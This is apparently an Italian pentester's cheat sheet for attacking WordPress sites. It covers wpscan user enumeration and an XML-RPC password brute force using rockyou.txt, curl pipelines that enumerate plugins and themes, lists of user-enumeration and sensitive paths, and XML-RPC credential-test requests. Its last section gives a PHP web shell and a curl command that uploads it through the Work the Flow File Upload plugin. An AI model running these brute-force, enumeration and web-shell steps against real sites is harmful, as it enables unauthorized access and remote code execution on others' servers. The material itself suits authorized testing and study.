```
### Wordpress - Tools

## Wpscan:
Tools per scanning automatizzato su CMS Wordpress, sia generico che speicifoc per singoli attacchi.



## Droopescan:
Alternativa a Wpscan



## CMSmap
Alternativa a Wpscan



## Wpscan - UserEnumeration:
> wpscan --url https://<target> --random-user-agent -e u



### Wpscan - Exploit XmlRPC:
> wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url https://<target>



## Common Attack - Pannelli amministrativi:
> cPanel 2082 - cPanel SSL 2083 -> cpanel.<nomeSito>.com o <nomeSito>:2082
> WHM 2086 - WHM SSL 2087 -> vhm.<nomeSito>.com o <nomeSito>:2086
> Webmail 2096 -> webmail.<nomeSito>.com o <nomeSito>:2096
> PhpMyAdmin -> <nomeSito>/PhPMyAdmin



## Common Attack - Plugin vulnerable:
> curl -s https://<nomeSito>/?p=1 | grep plugins
> Search: /wp-content/plugins/<namePlugin>


## Manual Plugin Enumeration:
> curl -s -X GET https://wordpress.com/ | grep -E 'wpcontent/plugins/' | sed -E 's,href=|src=,THIIIIS,g'| awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2


## Common Attack - Version Wordpress vulnerable:
> curl -s https://<nomeSito> | grep WordPress
Search: <meta name="generator" content="WordPress 6.3.1" />



## Common Attack - Search Themes:
> curl -s https://<nomeSito> | grep themes

## Manual Theme Enumeration:
> curl -s -X GET https://wordpress.com/ | grep -E 'wpcontent/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2


## Common Attack:
WpScan + Searchexploit su tutti i plugin che trova


## User Enumeration:
/wP-jsOn/wP/V2/UsErs/?search={admin}
/wP-jsOn/wP/V2/UsErs/1 
/wP-jsOn/wP/V2/UsErs 
?rest_route=/wp/v2/users
/AuthoR-SiteMap.xml 
/AuthoR/admin
/Author=1
/wp-json/oembed/1.0/embed?url=https://<nomeSito>/&format=json
/wp-json/oembed/1.0/embed?url=https:///<nomeSito>/<users>/&format=json 
/comments/feeds
/feed
public-api.wordpress.com/rest/v1.1/sites/blog.<nomeSito>.com/posts
api.*****.com/wp-json/wp/v2/users?search={admin}


## Altri Path utili:
/Wp-Admin
/Wp-lOgin.PhP
/WP-AdmIn/AdMIn-ajax.php
/Wp-aDmin/LoGin.php 
/Wp-aDmin/wP-logIn.php 
/LogIn.phP 
/LogIn.phP7 
/Wp-loGin.phP
/Wp-loGin.phP7 
/Wp-ContEnt/UploAds/WpForms/
/Wp-Content
/Wp-Content/UploaDs/
/Wp-conFig.PhP
/Wp-SiTeMaP.XmL
/PhPMyAdmin
CHANGELOG.txt
README.txt
robots.txt



## Page Enumeration:
/?p={id}
/?attachment_id={id}


## Path Vulnerable:
/wp-login.php?action=lostpassword 
/wp-login.php?action=register


## XMLRPC - Wordpress:
Verificare che sia disattivata la xxe rpc sui siti Wordpress. 
Se attivo è possibile "Publish a post", "Edit a post", "Delete a post", "Upload a new file", "Get a list of comments", "Edit comments", "PingBack".


## XML Body:
POST /xmlrpc%2ephp 
POST /xmlrpc.php HTTP/1.1 
Host: example.com
Content-Length: 135 

<?xml version="1.0" encoding="utf-8"?>   
<methodCall>    
	<methodName>system.listMethods</methodName>
	<params></params>
</methodCall>

<methodCall> 
	<methodName>wp.getUsersBlogs</methodName> 
	<params><param><value>admin</value></param>
	<param><value>password</value></param></params>
</methodCall>


```

```
### Wordpress - Structure

## Wordpress - User Role Permissions:

● Administrator: Administrators have the highest level of access and control over a single WordPress site. They can manage all aspects of the site, including content, themes, plugins, users, and settings.

● Editor: Editors have the authority to create, edit, publish, and delete any content on the site, including posts, pages, and media files. They do not have access to site settings, themes, or plugins.

● Author: Authors can create, edit, and publish their own posts. They do not have permission to edit or publish other users' posts or access site settings.

● Contributor: Contributors can write and submit posts for review, but they cannot publish them. Editors or Administrators must review and publish their submissions.

● Subscriber: Subscribers have the lowest level of access. They can only view and comment on posts. 


## Wp-Admin - Wordpress:
wp-admin La cartella contiene la pagina di login per l'accesso come amministratore e la dashboard di backend. Una volta effettuato l'accesso, un utente può apportare modifiche al sito in base alle autorizzazioni assegnate. La pagina di accesso può essere posizionata in uno dei seguenti percorsi:

- /wp-admin/login.php 
- /wp-admin/wp-login.php 
- /login.php 
- /wp-login.php  
  
Questo file può anche essere rinominato per rendere più difficile trovare la pagina di accesso. 


## Wp-Content - Wordpress:
wp-content La cartella è la directory principale in cui sono archiviati plugin e temi. La sottodirectory uploads/di solito è dove vengono archiviati tutti i file caricati sulla piattaforma. Queste directory e file devono essere enumerati attentamente poiché potrebbero contenere dati sensibili che potrebbero portare all'esecuzione di codice in modalità remota o allo sfruttamento di altre vulnerabilità o configurazioni errate.  


## Wp-Config - Wordpress:
wp-config.php Il file contiene le informazioni richieste da WordPress per connettersi al database, come il nome del database, l'host del database, il nome utente e la password, le chiavi e i sali di autenticazione e il prefisso della tabella del database. Questo file di configurazione può essere utilizzato anche per attivare la modalità DEBUG, che può essere utile nella risoluzione dei problemi.


## Wp-Includes - Wordpress:
wp-includes Contiene tutto tranne i componenti amministrativi e i temi che appartengono al sito web. Questa è la directory in cui sono archiviati i file principali, come certificati, caratteri, file JavaScript e widget.


## Wp-Active - Wordpress:
wp-activate.php Viene utilizzato per il processo di attivazione della posta elettronica durante la configurazione di un nuovo sito WordPress. 


## Index.php - Wordpress:
Index.php La home page di WordPress. 


## License - Wordpress:
License.txt Contiene informazioni utili come la versione WordPress installata. 


## XMLrpc - Wordpress:
xmlrpc.php è un file che rappresenta una funzionalità di WordPress che consente la trasmissione dei dati con HTTP che funge da meccanismo di trasporto e XML come meccanismo di codifica. Questo tipo di comunicazione è stata sostituita dalle API REST di WordPress. XMLRPC è uno standard usato per realizzare un file che consente a un sito WordPress di dialogare con altri portali. 

```


```
Wordpress - Common Vulnerabilities

## WordPress AdRotate - SQL Injection
## Wordpress Symposium Plugin - SQL Injection


## Wordpress - Work the Flow File Upload Plugin:
> cat shell.php
<?php
$output = shell_exec($_GET["cmd"]);
echo "<pre>$output</pre>";
?>

> curl -k -X POST -F "action=upload" -F "files=@./shell.php" http://wordpress.com/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php



## WP Appointment Booking Calendar Stored XSS

```